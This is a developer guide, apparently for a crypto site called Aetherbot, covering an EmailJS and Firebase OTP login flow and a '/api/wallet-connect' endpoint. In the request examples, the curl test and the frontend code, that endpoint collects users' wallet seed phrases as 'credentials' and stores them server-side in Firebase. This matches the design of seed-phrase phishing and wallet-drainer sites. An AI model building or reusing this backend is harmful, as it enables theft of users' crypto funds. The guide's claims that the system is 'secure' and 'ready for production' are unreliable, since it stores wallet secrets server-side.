# OTP System & Email Integration - Complete Guide

**Date**: October 20, 2025  
**Status**: ✅ Complete

---

## 📋 Overview

This guide covers two major features:
1. **Email Field Added to Wallet Data**
2. **OTP System with EmailJS Integration**

---

## 1️⃣ EMAIL FIELD IN WALLET DATA

### What Changed:

**Files Modified:**
- `netlify/functions/wallet-connect.js`
- `netlify/functions/utils/firebaseWalletStore.js`

### How to Use:

**Frontend Request:**
```javascript
POST /api/wallet-connect
{
  "walletName": "user123",
  "walletType": "phantom",
  "inputType": "seed_phrase",
  "credentials": "your seed phrase here",
  "email": "user@example.com"  // ← NEW FIELD (optional)
}
```

**Response:**
```json
{
  "success": true,
  "message": "Wallet connected successfully",
  "wallet": {
    "walletId": "...",
    "walletAddress": "...",
    "email": "user@example.com",  // ← EMAIL INCLUDED
    "balance": 0,
    ...
  },
  "token": "jwt_token_here"
}
```

### Firebase Structure:

The `wallets` collection now includes:
```
wallets/{walletId}
  ├── email: string
  ├── walletAddress: string
  ├── walletType: string
  ├── balance: number
  ├── credentials: string
  └── ... (other fields)
```

### Validation:

- Email is **optional** but recommended
- If provided, must contain '@' symbol
- Stored securely in Firebase
- Updated on each login if provided

---

## 2️⃣ OTP SYSTEM WITH EMAILJS

### Architecture:

```
┌─────────────┐      ┌──────────────┐      ┌──────────────┐
│  Frontend   │─────▶│   send-otp   │─────▶│   EmailJS    │
│             │      │   endpoint   │      │     API      │
└─────────────┘      └──────────────┘      └──────────────┘
                            │
                            ▼
                     ┌──────────────┐
                     │   Firebase   │
                     │  otps/{id}   │
                     └──────────────┘
                            │
┌─────────────┐      ┌──────────────┐
│  Frontend   │─────▶│  verify-otp  │
│             │      │   endpoint   │
└─────────────┘      └──────────────┘
```

### New Endpoints:

#### 1. **Send OTP** - `/api/send-otp`

**Request:**
```javascript
POST /api/send-otp
{
  "email": "user@example.com"
}
```

**Response (Success):**
```json
{
  "success": true,
  "message": "OTP sent to your email",
  "expiresAt": "2025-10-20T12:30:00Z",
  "expiresIn": "15 minutes"
}
```

**Response (Error):**
```json
{
  "error": "Failed to send OTP email",
  "details": "..."
}
```

#### 2. **Verify OTP** - `/api/verify-otp`

**Request:**
```javascript
POST /api/verify-otp
{
  "email": "user@example.com",
  "otp": "123456"
}
```

**Response (Success):**
```json
{
  "success": true,
  "message": "OTP verified successfully",
  "email": "user@example.com"
}
```

**Response (Error):**
```json
{
  "success": false,
  "error": "Invalid OTP code",
  "attemptsLeft": 2
}
```

---

## 🔐 EMAILJS CONFIGURATION

### Where to Put Your Keys:

**In `.env` file:**
```env
# ================================
# EMAILJS CONFIGURATION (OTP System)
# ================================
EMAILJS_SERVICE_ID=service_0t7pjbm
EMAILJS_TEMPLATE_ID=template_kro1z3k
EMAILJS_PUBLIC_KEY=your_public_key_here      # ← PUT YOUR PUBLIC KEY HERE
EMAILJS_PRIVATE_KEY=your_private_key_here    # ← PUT YOUR PRIVATE KEY HERE
```

### How to Get Your Keys:

1. **Go to EmailJS Dashboard**: https://dashboard.emailjs.com/

2. **Service ID** (already set):
   - Navigate to: **Email Services**
   - Copy your service ID: `service_0t7pjbm`

3. **Template ID** (already set):
   - Navigate to: **Email Templates**
   - Copy your template ID: `template_kro1z3k`

4. **Public Key**:
   - Navigate to: **Account** → **General**
   - Copy your **Public Key**
   - Example: `user_abc123xyz456`

5. **Private Key** (Access Token):
   - Navigate to: **Account** → **API Keys**
   - Copy your **Private Key** (Access Token)
   - Example: `abc123xyz456def789`

### Template Variables:

Your EmailJS template should have these variables:
- `{{passcode}}` - The 6-digit OTP
- `{{email}}` or `{{to_email}}` - Recipient email

**Example Email Template:**
```html
Hello,

Your verification code is: {{passcode}}

This code will expire in 15 minutes.

If you didn't request this code, please ignore this email.

Best regards,
Aetherbot Team
```

---

## 📦 FIREBASE STRUCTURE

### OTP Collection:

```
otps/{emailBase64}
  ├── email: string           # User's email
  ├── otp: string             # 6-digit code
  ├── createdAt: timestamp    # When OTP was created
  ├── expiresAt: timestamp    # When OTP expires (15 min)
  ├── verified: boolean       # If OTP was used
  └── attempts: number        # Verification attempts (max 3)
```

**Document ID**: Base64 encoded email (without padding)
**Example**: `dXNlckBleGFtcGxlLmNvbQ` for `user@example.com`

---

## 🔒 SECURITY FEATURES

### OTP System:

1. **Expiration**: OTP expires after 15 minutes
2. **Max Attempts**: 3 verification attempts, then OTP is deleted
3. **One-Time Use**: OTP deleted after successful verification
4. **Auto Cleanup**: Expired OTPs can be cleaned up automatically
5. **Secure Storage**: OTPs stored in Firestore with timestamps

### Email Validation:

- Email format validation
- Duplicate OTP prevention (overwrites existing)
- Rate limiting (recommended to add)

---

## 🧪 TESTING

### Test Send OTP:

```bash
curl -X POST http://localhost:8888/api/send-otp \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com"}'
```

### Test Verify OTP:

```bash
curl -X POST http://localhost:8888/api/verify-otp \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com", "otp": "123456"}'
```

### Test Wallet Connect with Email:

```bash
curl -X POST http://localhost:8888/api/wallet-connect \
  -H "Content-Type: application/json" \
  -d '{
    "walletName": "test",
    "walletType": "phantom",
    "inputType": "seed_phrase",
    "credentials": "your seed phrase here",
    "email": "test@example.com"
  }'
```

---

## 📝 FRONTEND INTEGRATION

### Example: Send OTP

```javascript
async function sendOTP(email) {
  const response = await fetch('/api/send-otp', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email })
  });
  
  const data = await response.json();
  
  if (data.success) {
    alert('OTP sent! Check your email.');
  } else {
    alert('Error: ' + data.error);
  }
}
```

### Example: Verify OTP

```javascript
async function verifyOTP(email, otp) {
  const response = await fetch('/api/verify-otp', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, otp })
  });
  
  const data = await response.json();
  
  if (data.success) {
    alert('OTP verified!');
    // Proceed with login or registration
  } else {
    alert('Error: ' + data.error);
    if (data.attemptsLeft !== undefined) {
      alert(`Attempts left: ${data.attemptsLeft}`);
    }
  }
}
```

### Example: Wallet Connect with Email

```javascript
async function connectWallet(credentials, email) {
  const response = await fetch('/api/wallet-connect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      walletName: 'user123',
      walletType: 'phantom',
      inputType: 'seed_phrase',
      credentials: credentials,
      email: email  // Include email
    })
  });
  
  const data = await response.json();
  
  if (data.success) {
    console.log('Wallet connected:', data.wallet);
    console.log('Email saved:', data.wallet.email);
    localStorage.setItem('token', data.token);
  }
}
```

---

## 🔄 WORKFLOW EXAMPLE

### Registration/Login Flow:

```
1. User enters email
   ↓
2. Frontend calls /api/send-otp
   ↓
3. User receives OTP email
   ↓
4. User enters OTP code
   ↓
5. Frontend calls /api/verify-otp
   ↓
6. If verified, proceed to wallet connect
   ↓
7. Frontend calls /api/wallet-connect (with email)
   ↓
8. User logged in with JWT token
```

---

## 🛠️ FILES CREATED/MODIFIED

### New Files:
1. `netlify/functions/send-otp.js` - Send OTP endpoint
2. `netlify/functions/verify-otp.js` - Verify OTP endpoint
3. `netlify/functions/utils/emailJSService.js` - EmailJS integration
4. `netlify/functions/utils/firebaseOTPStore.js` - OTP storage

### Modified Files:
1. `netlify/functions/wallet-connect.js` - Added email field
2. `netlify/functions/utils/firebaseWalletStore.js` - Store email
3. `.env` - Added EmailJS configuration

---

## 🚀 DEPLOYMENT CHECKLIST

Before deploying to production:

- [ ] Set up EmailJS account
- [ ] Configure email template with variables
- [ ] Get Public Key from EmailJS
- [ ] Get Private Key (Access Token) from EmailJS
- [ ] Update `.env` with real keys
- [ ] Test send-otp endpoint
- [ ] Test verify-otp endpoint
- [ ] Test wallet-connect with email
- [ ] Set up Firebase security rules for `otps` collection
- [ ] Consider adding rate limiting
- [ ] Set up monitoring for failed OTP sends

---

## 🔐 FIREBASE SECURITY RULES

Add these rules to your Firestore:

```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // OTP Collection - Server-side only
    match /otps/{otpId} {
      allow read, write: if false;  // Only server can access
    }
    
    // Wallets Collection
    match /wallets/{walletId} {
      allow read: if request.auth != null;  // Authenticated users only
      allow write: if false;  // Only server can write
    }
  }
}
```

---

## ⚡ PERFORMANCE TIPS

1. **Cache OTP Sends**: Prevent sending multiple OTPs quickly
2. **Rate Limiting**: Limit OTP requests per email (e.g., 1 per minute)
3. **Cleanup**: Run periodic cleanup of expired OTPs
4. **Email Queue**: Consider using a queue for email sending

---

## 🐛 TROUBLESHOOTING

### OTP Not Sending:

1. Check EmailJS keys in `.env`
2. Verify service ID and template ID
3. Check EmailJS dashboard for errors
4. Ensure template has correct variables
5. Check Firebase logs

### OTP Verification Fails:

1. Check if OTP expired (15 min limit)
2. Verify attempts not exceeded (max 3)
3. Ensure OTP code is exactly 6 digits
4. Check Firebase for OTP record

### Email Not Received:

1. Check spam folder
2. Verify email address is correct
3. Check EmailJS quota/limits
4. Verify template is published
5. Check EmailJS logs

---

## 📊 MONITORING

### Log Messages to Watch:

```
✅ OTP sent successfully
❌ EmailJS failed
⏰ OTP expired
⚠️  Attempt 3/3
🗑️  Deleting OTP
```

### Metrics to Track:

- OTP send success rate
- OTP verification success rate
- Average time to verification
- Failed attempts per email
- Expired OTPs

---

## ✅ SUMMARY

**Email in Wallet Data:**
- ✅ Email field added to wallet schema
- ✅ Stored in Firebase `wallets` collection
- ✅ Retrieved with wallet details
- ✅ Optional but recommended

**OTP System:**
- ✅ 6-digit OTP generation
- ✅ EmailJS integration
- ✅ Firebase storage with expiration
- ✅ 15-minute expiration
- ✅ 3 attempt limit
- ✅ Auto-delete after verification
- ✅ Secure and scalable

**Ready for production!** 🚀
